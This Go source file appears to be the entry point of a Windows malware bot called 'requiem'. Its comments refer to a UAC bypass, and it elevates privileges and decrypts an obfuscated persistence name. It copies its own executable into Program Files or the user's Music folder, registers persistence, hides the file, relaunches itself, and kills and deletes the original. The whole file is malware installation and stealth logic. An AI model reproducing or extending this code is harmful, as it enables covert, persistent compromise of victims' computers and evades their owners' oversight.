package main

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"time"

	"requiem/bot"
	"requiem/funcs"
	"requiem/persistence"
	"requiem/store"
	"requiem/utils"
)

const DELETE_OLD_FILE_MAX_RETRIES int = 20

func main() {
	if !utils.CheckMutex() {
		return
	}

	defer utils.RemoveMutex()

	store.InitState()
	utils.DebugLog("\n")

	args := os.Args
	utils.DebugLog(fmt.Sprintf("all args - %v", args))

	if len(args) > 1 && args[1] == store.LAUNCH_KEY {
		if len(args) == 3 {
			oldThing := args[2]

			_, err := strconv.Atoi(oldThing)
			if err == nil {
				// the 3rd arg is a pid when it bypasses uac
				// see /bot/commands/uac.go @ if utils.HasFlag(content, "bypass") {
				utils.RunCommand("taskkill", "/f", "/pid", oldThing)
			} else {
				path := filepath.Clean(oldThing)

				info, err := os.Stat(path)
				if err != nil {
					return
				}

				if info.IsDir() {
					return
				}

				err = utils.RunCommand("taskkill", "/f", "/im", filepath.Base(path))
				if err != nil {
					utils.DebugLog(fmt.Sprintf("failed to kill launch exec - %s", err))
				}

				for i := range DELETE_OLD_FILE_MAX_RETRIES {
					err = os.Remove(path)
					if err == nil {
						break
					}

					utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %s", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
					time.Sleep(500 * time.Millisecond)
				}
			}
		}

		utils.DebugLog("starting")

		bot.Start()
		return
	}

	if store.REQUIRE_ADMIN && !store.IsAdmin {
		funcs.ElevateWithConfig()
	}

	var newDir string
	var newName string

	if store.USE_CUSTOM_NAME {
		newName = store.CUSTOM_NAME
	} else {
		newName = "_" + filepath.Base(store.ExecPath)
	}

	store.DecryptedPersistenceName = utils.Decrypt(store.PERSISTENCE_NAME)

	if store.USE_CUSTOM_DIR {
		newDir = store.CUSTOM_DIR
	} else {
		if store.IsAdmin {
			newDir = path.Join(
				os.Getenv("PROGRAMFILES"),
				store.DecryptedPersistenceName,
			)
		} else {
			newDir = path.Join(store.HomePath, "Music")
		}
	}

	err := os.MkdirAll(newDir, 0666)
	if err != nil {
		utils.DebugLog(fmt.Sprintf("failed to create dir - %s", err))
		return
	}

	newExecPath := filepath.Join(newDir, newName)
	utils.DebugLog(fmt.Sprintf("new path - %q", newExecPath))

	err = utils.CopyFile(store.ExecPath, newExecPath)
	if err != nil {
		utils.DebugLog(fmt.Sprintf("failed to copy file - %s", err))
		return
	}

	persistence.Persist(newExecPath)
	utils.HideFile(newExecPath)

	utils.RemoveMutex()

	utils.DebugLog(fmt.Sprintf(
		"relaunching - %q -> %q %s",
		store.ExecPath,
		newExecPath,
		store.LAUNCH_KEY,
	))

	utils.RunCommand(
		newExecPath,
		store.LAUNCH_KEY,
		store.ExecPath,
	)

	os.Exit(0)
}
